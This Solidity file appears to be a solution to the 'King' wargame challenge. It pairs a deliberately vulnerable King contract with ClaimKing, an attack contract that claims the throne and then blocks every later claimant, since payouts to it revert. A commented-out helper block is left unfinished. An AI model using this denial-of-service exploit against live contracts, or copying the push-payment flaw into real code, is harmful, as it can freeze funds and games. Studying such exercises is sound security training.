// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

interface IKing {
    function prize() external view returns (uint256);
}

contract ClaimKing {
    constructor(address _targetContractAddress) payable {
        IKing king = IKing(_targetContractAddress);
        uint256 attackValue = king.prize() + 1 wei;
        if (attackValue > address(this).balance) revert("Not enough funds");

        // Attack contract
        (bool success, ) = _targetContractAddress.call{value: attackValue}("");
        if (!success) revert("Call failed");

        // Refund remaining balance
        (bool refundSuccess, ) = address(msg.sender).call{
            value: address(this).balance
        }("");
        if (!refundSuccess) revert("Refund call failed");
    }
}

/* 
import "@openzeppelin/contracts/utils/Address.sol";

contract Demo {
  using Address for address payable;

  King public king = King(payable(0x)) //hardcode

  function send() public payable {
    payable(address(king)).sendValue(msg.value);
  }
}
 */
